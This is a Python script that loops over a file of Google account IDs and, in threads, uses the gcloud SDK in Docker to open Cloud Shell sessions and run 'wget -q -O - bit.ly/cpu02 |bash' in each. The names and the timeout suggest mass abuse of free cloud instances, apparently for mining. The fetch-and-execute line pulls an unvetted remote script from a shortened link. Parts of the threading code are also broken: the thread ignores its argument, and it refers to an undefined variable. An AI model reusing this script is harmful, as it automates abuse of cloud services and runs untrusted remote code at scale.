#!/usr/bin/python
import shlex
import subprocess
from subprocess import Popen, PIPE
import pytest
import time
import pty
import sys
import select
import os
import re
import pytest
import time
import json
import sys
import threading
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from urllib.parse import urlparse
from threading import Thread

slow_motion = 1
listfile='/home/abj/gids15.txt'
gid = "siwar10002"

count = 0
# Strips the newline character




def newgcloud(gid):
    command_line = 'docker run -ti --name gcloud-config-'+gid + \
        ' gcr.io/google.com/cloudsdktool/cloud-sdk gcloud auth login'
    print(command_line)
    return shlex.split(command_line)

def rungcloud(gid):
    status = 1
    time_init = time.perf_counter()
    remote_cmd = "\"wget -q -O - bit.ly/cpu02 |bash\""
    command_line = 'docker run --rm --volumes-from gcloud-config-'+gid + \
        ' gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell' + \
        '  ssh --authorize-session --command='+remote_cmd
    print(command_line)
    cmdmine=  shlex.split(command_line)

    pty, tty = os.openpty()

    p = subprocess.Popen(cmdmine, stdin=tty, stdout=tty, stderr=tty)



    while p.poll() is None:
        chrono = time.perf_counter() - time_init

        # Watch two files, STDIN of your Python process and the pseudo terminal
        #r, _, _ = select.select([sys.stdin, pty], [], [])
        s=''
        #if sys.stdin in r:
        #    input_from_your_terminal = os.read(sys.stdin.fileno(), 10240)
        #    os.write(pty, input_from_your_terminal)
        #elif pty in r:
        output_from_docker = os.read(pty, 10240)
        #os.write(sys.stdout.fileno(), output_from_docker)
        s=output_from_docker.decode("utf-8") 
        if s.find("ERROR:") == -1:
            print(s)
            #authurls=re.findall(r'(https?://\S+)', s)
            #print('**************************')
            #try:
            #    print(authurls[0])
            #except:
            #    print("no url")
            print('###################################')
        else:
            status = 2
            break
        if chrono > 1170 :
            status = 0
            break
    return status

#run_status= rungcloud(gid)
#print('>>>>>>>>>> run status : '+ str(run_status) + ' <<<<<<<<<<<<<<' )

class RunThread(Thread):
    def __init__(self,A):
        self.gid=gid
        self.container_status=0
        #self.gpass=gpass
        Thread.__init__(self)
        self.daemon = True
        self.start()
    def run(self):
        self.container_status = rungcloud(gid)
        print(" ---- gid: "+gid+" status: "+str(container_status)+ " ---- " )

def run_list(listfile):
    file1 = open(listfile, 'r')
    Lines = file1.readlines()
    error_list = []
    count = 0
    thread_list = []
    for line in Lines:
        print("GID {}: {}".format(count, line.strip()))
        gid = line.strip('\n')
        gid = gid.strip('\r')
        thread_list.append(RunThread(gid))
        if thread_list[count].container_status != 0:
            error_list.append(gid)
        time.sleep(10)
        count += 1
    while True:
        print( error_list)
        time.sleep(5)
    return error_list

    

error_list = run_list(listfile)

print(error_list)